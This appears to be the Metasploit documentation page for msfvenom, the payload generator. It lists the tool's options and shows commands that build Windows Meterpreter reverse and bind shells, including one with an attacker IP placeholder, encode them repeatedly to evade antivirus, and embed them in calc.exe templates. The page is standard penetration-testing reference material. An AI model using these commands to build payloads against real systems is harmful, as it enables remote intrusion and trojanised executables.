I"Œ<p>Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015.</p>

<p>To start using msfvenom, first please take a look at the options it supports:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Options:
    -p, --payload       &lt;payload&gt;    Payload to use. Specify a '-' or stdin to use custom payloads
        --payload-options            List the payload's standard options
    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
    -n, --nopsled       &lt;length&gt;     Prepend a nopsled of [length] size on to the payload
    -f, --format        &lt;format&gt;     Output format (use --help-formats for a list)
        --help-formats               List available formats
    -e, --encoder       &lt;encoder&gt;    The encoder to use
    -a, --arch          &lt;arch&gt;       The architecture to use
        --platform      &lt;platform&gt;   The platform of the payload
        --help-platforms             List available platforms
    -s, --space         &lt;length&gt;     The maximum size of the resulting payload
        --encoder-space &lt;length&gt;     The maximum size of the encoded payload (defaults to the -s value)
    -b, --bad-chars     &lt;list&gt;       The list of characters to avoid example: '\x00\xff'
    -i, --iterations    &lt;count&gt;      The number of times to encode the payload
    -c, --add-code      &lt;path&gt;       Specify an additional win32 shellcode file to include
    -x, --template      &lt;path&gt;       Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
    -o, --out           &lt;path&gt;       Save the payload
    -v, --var-name      &lt;name&gt;       Specify a custom variable name to use for certain output formats
        --smallest                   Generate the smallest possible payload
    -h, --help                       Show this message
</code></pre></div></div>

<h1 id="how-to-generate-a-payload">How to generate a payload</h1>

<p>To generate a payload, there are two flags that you must supply (-p and -f):</p>

<ul>
  <li><strong>The -p flag: Specifies what payload to generate</strong></li>
</ul>

<p>To see what payloads are available from Framework, you can do:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -l payloads
</code></pre></div></div>

<p>The -p flag also supports â€œ-â€œ as a way to accept a custom payload:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
</code></pre></div></div>

<ul>
  <li><strong>The -f flag: Specifies the format of the payload</strong></li>
</ul>

<p>Syntax example:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -f exe
</code></pre></div></div>

<p>To see what formats are supported, you can do the following to find out:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom --help-formats
</code></pre></div></div>

<p>Typically, this is probably how you will use msfvenom:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
</code></pre></div></div>

<h1 id="how-to-encode-a-payload">How to encode a payload</h1>

<p>By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
</code></pre></div></div>

<p>To find out what encoders you can use, you can use the -l flag:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -l encoders
</code></pre></div></div>

<p>You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isnâ€™t really meant to be used a real AV evasion solution:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 
</code></pre></div></div>

<h1 id="how-to-avoid-bad-characters">How to avoid bad characters</h1>

<p>The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -b '\x00' -f raw
</code></pre></div></div>

<h1 id="how-to-supply-a-custom-template">How to supply a custom template</h1>

<p>By default, msfvenom uses templates from the msf/data/templates directory. If youâ€™d like to choose your own, you can use the -x flag like the following:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 
</code></pre></div></div>

<p>Please note: If youâ€™d like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe
</code></pre></div></div>

<p>The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.</p>

<h1 id="how-to-chain-msfvenom-output">How to chain msfvenom output</h1>

<p>The old <code class="highlighter-rouge">msfpayload</code> and <code class="highlighter-rouge">msfencode</code> utilities were often chained together in order layer on multiple encodings. This is possible using <code class="highlighter-rouge">msfvenom</code> as well:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
./msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
</code></pre></div></div>
:ET